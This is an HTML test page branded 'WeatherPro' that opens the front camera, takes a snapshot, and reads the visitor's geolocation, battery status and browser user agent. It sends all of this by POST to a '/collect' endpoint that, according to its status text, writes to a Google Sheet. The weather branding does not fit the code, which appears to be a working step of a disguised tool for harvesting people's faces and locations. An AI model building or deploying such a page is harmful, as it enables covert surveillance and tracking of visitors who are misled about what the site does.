<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Connection Test | WeatherPro</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body { font-family: sans-serif; background: #0b1523; color: white; padding: 20px; }
    .card { background: #121e2e; padding: 20px; border-radius: 12px; margin-bottom: 10px; border: 1px solid #4fd1c5; }
    .btn { background: #4fd1c5; color: #073b3a; border: 0; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; margin: 5px; }
    video { width: 100%; max-width: 300px; display: block; margin-top: 10px; border-radius: 8px; }
    #status { padding: 10px; margin-top: 10px; border-radius: 8px; }
    .ok { background: #1b3f2b; color: #9deaa3; }
    .err { background: #3f1b1b; color: #ff9da3; }
  </style>
</head>
<body>
  <h1>Step 1: Connection Test</h1>
  
  <div class="card">
    <button id="btnCam" class="btn">1. Test Camera</button>
    <button id="btnGather" class="btn">2. Gather Data</button>
    <button id="btnSend" class="btn">3. Send to Sheet</button>
    <video id="preview" autoplay playsinline muted></video>
    <div id="status">Ready to test...</div>
  </div>

  <canvas id="canv" style="display:none;"></canvas>

  <script>
    let stream, payload = {};
    const status = document.getElementById('status');

    // 1. Camera
    document.getElementById('btnCam').addEventListener('click', async () => {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        document.getElementById('preview').srcObject = stream;
        status.innerText = "‚úÖ Camera working!";
        status.className = "ok";
      } catch (e) { status.innerText = "‚ùå Camera Error: " + e.message; status.className = "err"; }
    });

    // 2. Gather
    document.getElementById('btnGather').addEventListener('click', async () => {
      const battery = await navigator.getBattery();
      const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r, () => r({coords:{latitude:0, longitude:0}})));
      
      const canvas = document.getElementById('canv');
      const ctx = canvas.getContext('2d');
      canvas.width = 320; canvas.height = 240;
      ctx.drawImage(document.getElementById('preview'), 0, 0, 320, 240);
      
      payload = {
        ts: new Date().toISOString(),
        hints: { ua: navigator.userAgent },
        battery: { levelPercent: Math.round(battery.level * 100), charging: battery.charging },
        location: { lat: pos.coords.latitude, lon: pos.coords.longitude },
        burstImages: [canvas.toDataURL('image/jpeg', 0.5)]
      };
      status.innerText = "‚úÖ Data gathered locally!";
    });

    // 3. Send
    document.getElementById('btnSend').addEventListener('click', async () => {
      status.innerText = "Sending...";
      try {
        const res = await fetch('/collect', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        if (res.ok) {
          status.innerText = "üéâ SUCCESS! Check your Google Sheet.";
          status.className = "ok";
        } else {
          status.innerText = "‚ùå Server Error. Check Render Logs.";
          status.className = "err";
        }
      } catch (e) { status.innerText = "‚ùå Network Error."; status.className = "err"; }
    });
  </script>
</body>
</html>
